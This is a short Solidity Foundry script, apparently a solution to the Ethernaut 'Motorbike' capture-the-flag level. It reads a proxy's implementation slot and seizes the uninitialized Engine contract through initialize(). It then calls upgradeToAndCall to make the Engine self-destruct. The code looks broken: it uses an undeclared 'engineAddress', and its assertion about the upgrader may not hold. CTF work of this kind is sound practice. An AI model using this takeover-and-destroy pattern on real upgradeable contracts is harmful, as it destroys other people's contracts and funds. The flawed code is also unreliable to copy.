// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Level25.sol";
import "../src/AttackerSelfDestructLevel25.sol";

contract AttackerScript is Script {
    Motorbike public moto = Motorbike(0x5E62EE579f78C2eB8C27d7324fFBC47E1bfCa4B6);
    Engine public engine = Engine(address(uint160(uint256(vm.load(address(moto), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
    Attacker public attacker;

    address bob = vm.addr(1); // exploiter address here

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      attacker = new Attacker();

      engineAddress.initialize();
      assert(engineAddress.upgrader() == bob);
      bytes memory encodedData = abi.encodeWithSignature("selfDestruct()");
      engineAddress.upgradeToAndCall(address(attacker), encodedData);

      vm.stopBroadcast();
    }
}